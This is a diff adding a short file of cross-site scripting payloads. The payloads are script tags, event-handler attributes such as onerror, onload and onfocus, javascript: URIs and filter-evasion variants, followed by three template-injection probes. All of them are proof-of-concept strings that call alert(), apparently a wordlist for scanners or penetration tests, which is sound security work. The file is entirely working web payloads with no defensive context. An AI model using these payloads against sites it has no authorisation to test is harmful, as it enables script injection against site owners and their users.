@@ -1,0 +1,19 @@
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+'><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<ScRiPt>alert('XSS')</ScRiPt>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+<select onchange=alert('XSS')><option>1</option></select>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen autofocus onfocus=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+{{7*7}}
+${7*7}
+#{7*7}
